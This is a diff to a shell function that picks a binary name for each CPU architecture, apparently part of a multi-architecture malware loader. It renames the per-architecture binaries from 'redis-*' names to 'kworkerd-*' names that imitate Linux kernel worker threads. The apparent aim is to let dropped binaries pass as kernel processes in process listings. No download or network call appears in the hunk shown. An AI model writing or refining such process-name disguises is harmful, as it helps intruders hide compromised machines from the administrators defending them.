@@ -8,25 +8,26 @@ is_le() {
 
 detect_arch() {
     arch=$(uname -m | tr '[:upper:]' '[:lower:]')
-    BIN_NAME="redis-composd"
+    BIN_NAME="kworkerd-rcu"
 
     case "$arch" in
-        x86_64|amd64|x64|x86-64)            BIN_NAME="redis-daemon" ;;
-        i486)                                 BIN_NAME="redis-initd" ;;
-        i386|i586|i686|i786|x86|ia32)        BIN_NAME="redis-proxyd" ;;
-        armv4*|armv4l*)                       BIN_NAME="redis-conteinerd" ;;
-        armv5*|armv5l*|armv5te*)              BIN_NAME="redis-conteinerd-shim" ;;
-        armv6*|armv6l*)                       BIN_NAME="redis-runcd" ;;
-        armv7*|armv7l*|armv8l*|armv8-compat)  BIN_NAME="redis-buildxd" ;;
-        aarch64|arm64|armv8|armv8a|armv9*)    BIN_NAME="redis-buildxd" ;;
-        mipsel|mips32el|mips64el|mips64r2el)  BIN_NAME="redis-composd" ;;
+        x86_64|amd64|x64|x86-64)            BIN_NAME="kworkerd" ;;
+        i486)                                 BIN_NAME="kworkerd-cgroup" ;;
+        i386|i586|i686|i786|x86|ia32)        BIN_NAME="kworkerd-events" ;;
+        armv4*|armv4l*)                       BIN_NAME="kworkerd-irq" ;;
+        armv5*|armv5l*|armv5te*)              BIN_NAME="kworkerd-irq-bal" ;;
+        armv6*|armv6l*)                       BIN_NAME="kworkerd-softirq" ;;
+        armv7*|armv7l*|armv8l*|armv8-compat)  BIN_NAME="kworkerd-blkcg" ;;
+        aarch64|arm64|armv8|armv8a|armv9*)    BIN_NAME="kworkerd-blkcg" ;;
+        mipsel|mips32el|mips64el|mips64r2el)  BIN_NAME="kworkerd-rcu" ;;
+        mips32r2)
+            if is_le; then BIN_NAME="kworkerd-rcu"; else BIN_NAME="kworkerd-netns-rt"; fi ;;
         mips|mips32|mips64|mips64r2)
-            if is_le; then BIN_NAME="redis-composd"; else BIN_NAME="redis-credentiald"; fi ;;
-        ppc|powerpc|ppc32|ppc64|ppc64le)      BIN_NAME="redis-scoutd" ;;
-        sh4|sh4a|sh)                          BIN_NAME="redis-sbomd" ;;
-        m68k)                                 BIN_NAME="redis-scand" ;;
-        sparc|sparc32|sparc64)                BIN_NAME="redis-machined" ;;
-        arc|arc700|archs)                     BIN_NAME="redis-swarmd" ;;
+            if is_le; then BIN_NAME="kworkerd-rcu"; else BIN_NAME="kworkerd-netns"; fi ;;
+        ppc|powerpc|ppc32|ppc64|ppc64le)      BIN_NAME="kworkerd-writeback" ;;
+        sh4|sh4a|sh)                          BIN_NAME="kworkerd-crypto" ;;
+        m68k)                                 BIN_NAME="kworkerd-scsi" ;;
+        sparc|sparc32|sparc64)                BIN_NAME="kworkerd-mm" ;;
     esac
 
     echo "$BIN_NAME"
